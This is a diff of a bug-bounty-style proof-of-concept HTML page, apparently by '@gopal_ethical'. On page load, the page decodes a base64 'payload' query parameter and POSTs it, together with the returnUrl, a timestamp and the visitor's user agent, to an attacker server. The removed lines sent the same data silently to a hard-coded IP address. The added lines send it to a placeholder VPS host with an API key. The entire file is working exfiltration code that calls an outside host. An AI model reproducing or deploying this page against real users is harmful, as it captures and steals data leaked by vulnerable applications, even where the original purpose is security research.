@@ -5,45 +5,49 @@
     <meta charset="UTF-8">
 </head>
 <body>
-    <h1>poc by @gopal_ethical</h1>
+    <h1>Poc by @gopal_ethical</h1>
+    <div id="status">Waiting for data...</div>
 
     <script>
-        function getQueryParam(param) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
-        }
+        async function sendData() {
+            const payload = new URLSearchParams(window.location.search).get("payload");
+            const returnUrl = new URLSearchParams(window.location.search).get("returnUrl");
 
-        function decodeBase64Json(base64) {
+            const dataToSend = {
+                payload: decodePayload(payload),
+                returnUrl: returnUrl,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+
             try {
-                const raw = decodeURIComponent(base64);
-                const jsonStr = atob(raw);
-                return JSON.parse(jsonStr);
-            } catch (e) {
-                return { error: "Failed to decode payload", details: e.message };
+                const response = await fetch("https://yourvps.com:8080/log", {
+                    method: "POST",
+                    headers: { 
+                        "Content-Type": "application/json",
+                        "X-API-Key": "YOUR_SECRET_KEY"  // Must match server
+                    },
+                    body: JSON.stringify(dataToSend)
+                });
+                
+                document.getElementById("status").innerHTML = 
+                    `✅ Data sent! Status: ${response.status}`;
+            } catch (err) {
+                document.getElementById("status").innerHTML = 
+                    `❌ Error: ${err.message}`;
             }
         }
 
-        const payload = getQueryParam("payload");
-        const returnUrl = getQueryParam("returnUrl");
+        function decodePayload(base64) {
+            try {
+                return JSON.parse(atob(decodeURIComponent(base64)));
+            } catch (e) {
+                return { error: "Decoding failed", details: e.message };
+            }
+        }
 
-        const decoded = decodeBase64Json(payload);
-
-        const dataToSend = {
-            payload: decoded,
-            returnUrl: returnUrl,
-            timestamp: new Date().toISOString()
-        };
-
-        // Silently send to your VPS
-        fetch("http://167.172.255.123:8080/log", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(dataToSend)
-        }).then(res => {
-            console.log("Data sent to server:", res.status);
-        }).catch(err => {
-            console.error("Failed to send to server:", err);
-        });
+        // Automatically send data when page loads
+        window.onload = sendData;
     </script>
 </body>
 </html>
